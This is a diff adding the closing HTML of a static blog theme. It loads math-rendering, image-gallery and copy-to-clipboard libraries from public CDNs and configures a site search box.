+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
+    
+</body>
+</html>
